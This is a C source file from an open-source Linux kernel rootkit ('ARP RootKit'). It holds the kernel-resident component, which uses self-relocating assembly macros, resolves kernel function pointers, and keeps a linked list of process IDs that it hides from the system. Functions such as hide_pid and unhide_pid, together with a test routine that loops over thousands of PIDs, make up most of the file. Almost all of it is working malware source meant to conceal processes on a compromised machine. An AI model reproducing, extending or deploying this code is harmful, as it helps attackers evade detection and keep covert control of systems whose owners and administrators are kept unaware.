/*
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

/*
 * Only this is what will get resident in the Linux Kernel.
 *
 * IMPORTANT: If you will be hacking this, DO NOT USE static/global variables (local/auto is ok), because they will not get relocated. Use the self-relocating macros, that calculates delta.
 *
 */

#define LABEL(name) asm( \
"\t.globl\t"#name"\n" \
"\t.type\t"#name", @function\n" \
#name":\n" \
"\t.size\t"#name", .-"#name"\n" \
);

#define DSTR(name, str) asm( \
"\t.globl\t"#name"\n" \
"\t.type\t"#name", @function\n" \
#name":\n" \
"\tcall\t"#name"_delta\n" \
"\tret\n" \
"\t.string\t"#str"\n" \
"\t.size\t"#name", .-"#name"\n" \
"\t.globl\t"#name"_delta\n" \
"\t.type\t"#name"_delta, @function\n" \
#name"_delta:\n" \
"\tmov\t(%rsp), %rax\n" \
"\tinc\t%rax\n" \
"\tret\n" \
"\t.size\t"#name"_delta, .-"#name"_delta" \
);

#define DZERO(name, size) asm( \
"\t.globl\t"#name"\n" \
"\t.type\t"#name", @function\n" \
#name":\n" \
"\tcall\t"#name"_delta\n" \
"\tret\n" \
"\t.zero\t"#size"\n" \
"\t.size\t"#name", .-"#name"\n" \
"\t.globl\t"#name"_delta\n" \
"\t.type\t"#name"_delta, @function\n" \
#name"_delta:\n" \
"\tmov\t(%rsp), %rax\n" \
"\tinc\t%rax\n" \
"\tret\n" \
"\t.size\t"#name"_delta, .-"#name"_delta" \
);

#define D8(name) DZERO(name, 8)
#define D4(name) DZERO(name, 4)
#define D2(name) DZERO(name, 2)
#define D1(name) DZERO(name, 1)

#define DPTR(name) D8(name)

LABEL(kernel_start)

#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>

/*
 * Macros.
 */
#define PREFIX_MAX 32
#define LOG_LINE_MAX (1024 - PREFIX_MAX)

/*
 * Types
 */
struct pid_list_node {
    pid_t nr;
    struct task_struct *task;
    struct pid_list_node *next;
};

/*
 * Function declarations.
 */
int hide_pid(pid_t pid);
int unhide_pid(pid_t pid);
int pinfo(const char *fmt, ...);
int perr(const char *fmt, ...);
int vpfd(int fd, const char *fmt, va_list args);
void pid_list_create(void);
void pid_list_destroy(void);
void pid_list_push(pid_t nr);
pid_t pid_list_pop(pid_t nr);
struct pid_list_node *pid_list_find(pid_t nr);
//void *readfile(const char *file, size_t *len);

/*
 * Declarations of Linux Kernel functions.
 */
typedef void * (*tf_kmalloc)(size_t size, gfp_t flags);
typedef void (*tf_kfree)(const void *);
typedef struct pid * (*tf_find_vpid)(pid_t nr);
typedef int (*tf_vscnprintf)(char *buf, size_t size, const char *fmt, va_list args);
typedef int (*tf_sys_write)(int fd, const char *mem, size_t len);

extern tf_kmalloc *f_kmalloc(void);
extern tf_kfree *f_kfree(void);
extern tf_find_vpid *f_find_vpid(void);
extern tf_vscnprintf *f_vscnprintf(void);
extern tf_sys_write *f_sys_write(void);

/*
 * Variable declarations.
 */
extern struct pid_list_node **pid_list_head(void);
extern struct pid_list_node **pid_list_tail(void);
extern const char *MSG_PID_UHD(void);
extern const char *MSG_PID_AHD(void);
extern const char *MSG_PID_HD(void);
extern const char *MSG_PID_NF(void);
extern const char *MSG_PID_NH(void);
extern const char *MSG_KM_ERR(void);

void kernel_test(void) {
	size_t i;

    /*
	 * Testing pid_list
	 */
	pid_list_create();

	for (i = 1; i < 4096; i++) {
		hide_pid(i);
		unhide_pid(i);
	}

	for(i = 1; i < 4096; i++) {
		hide_pid(i);
	}

	for (i = 1; i < 4096; i++) {
		unhide_pid(i);
	}

	for (i = 1; i < 4096; i++) {
		hide_pid(i);
	}

	pid_list_destroy();
}

int hide_pid(pid_t nr) {
	struct pid *pid;
	
	pid = (*f_find_vpid())(nr);
	if (pid) {
		if (pid_list_find(nr)) {
			perr(MSG_PID_AHD(), nr);
		} else {
			pid_list_push(nr);
			pinfo(MSG_PID_HD(), nr);
			return 0;
		}
	} else {
		perr(MSG_PID_NF(), nr);
	}

	return -1;
}

int unhide_pid(pid_t nr) {
	if (pid_list_pop(nr) == nr) {
		pinfo(MSG_PID_UHD(), nr);

		return 0;
	} else {
		perr(MSG_PID_NH(), nr);
	}
	
	return -1;
}

void pid_list_push(pid_t nr) {
	struct pid_list_node *node;

	node = (*f_kmalloc())(sizeof(struct pid_list_node), GFP_KERNEL);
	if (node) {
		(*pid_list_tail())->next = node;
		*pid_list_tail() = node;
		node->next = NULL;
		node->nr = nr;
	} else {
		perr(MSG_KM_ERR(), __LINE__);
	}
}

struct pid_list_node *pid_list_find(pid_t nr) {
	struct pid_list_node *node;

	node = *pid_list_head();
	while(node) {
        if (node->nr == nr) {
			return node;
		}
		node = node->next;
	}

	return NULL;
}

pid_t pid_list_pop(pid_t nr) {
	struct pid_list_node *node, *prev;

	prev = node = *pid_list_head();
	while(node) {
		if (node->nr == nr) {
			prev->next = node->next;
			if (*pid_list_tail() == node) {
				*pid_list_tail() = prev;
			}
			(*f_kfree())(node);

			return nr;
		}
		prev = node;
		node = node->next;
	}

	return -1;
}

void pid_list_create() {
	struct pid_list_node *node;

	node = (*f_kmalloc())(sizeof(struct pid_list_node), GFP_KERNEL);
	node->next = NULL;
	node->nr = 0;

	*pid_list_head() = *pid_list_tail() = node;
}

void pid_list_destroy() {
	while((*pid_list_head())->next) {
		unhide_pid((*pid_list_tail())->nr);
	}

	(*f_kfree())(*pid_list_head());
}

/*
void *readfile(const char *file, size_t *len) {
	int fd;
	void *buf;
	struct stat fd_st;

	mm_segment_t old_fs = get_fs();
	set_fs(KERNEL_DS);
	fd = open(file, O_RDONLY, 0);
	if (fd >= 0) {
		newfstat(fd, &fd_st);
		buf = kmalloc(fd_st.st_size, GFP_KERNEL);
		if (buf) {
			if (read(fd, buf, fd_st.st_size) == fd_st.st_size) {
				*len = fd_st.st_size;
				close(fd);
				return buf;
			} else {
				perr("can't read lkm");
			}
		} else {
			perr("create_load_info kmalloc error");
		}

		close(fd);
	} else {
		perr("can't open lkm");
	}
	set_fs(old_fs);

	return NULL;
}
*/

int pinfo(const char *fmt, ...) {
    va_list args;
	int ret;

    va_start(args, fmt);
    ret = vpfd(1, fmt, args);
    va_end(args);
	return ret;
}

int perr(const char *fmt, ...) {
    va_list args;
    int ret;

    va_start(args, fmt);
    ret = vpfd(2, fmt, args);
    va_end(args);
    return ret;
}

int vpfd(int fd, const char *fmt, va_list args) {
    char *textbuf = NULL;
    size_t len = 0;
	mm_segment_t old_fs;

	textbuf = (*f_kmalloc())(LOG_LINE_MAX, GFP_KERNEL);
	if (textbuf) {
		len = (*f_vscnprintf())(textbuf, LOG_LINE_MAX, fmt, args);
	    old_fs = get_fs();
	    set_fs(KERNEL_DS);
		len = (*f_sys_write())(fd, textbuf, len);
		(*f_kfree())(textbuf);
		set_fs(old_fs);
		return len;
	} else {
		return -1;
	}
}

LABEL(kernel_code_end)

/*
 * Linux Kernel functions.
 */
DPTR(f_kmalloc)
DPTR(f_kfree)
DPTR(f_find_vpid)
DPTR(f_vscnprintf)
DPTR(f_sys_write)

/*
 * Strings.
 */
DSTR(MSG_PID_UHD, "PID %d unhidden.\n")
DSTR(MSG_PID_AHD, "PID %d already hidden.\n")
DSTR(MSG_PID_HD, "PID %d hidden.\n")
DSTR(MSG_PID_NF, "PID %d not found.\n")
DSTR(MSG_PID_NH, "PID %d is not hidden.\n")
DSTR(MSG_KM_ERR, "f_kmalloc error, line %d.\n")

/*
 * Global variable definitions.
 */
DPTR(pid_list_head)
DPTR(pid_list_tail)

LABEL(kernel_end)
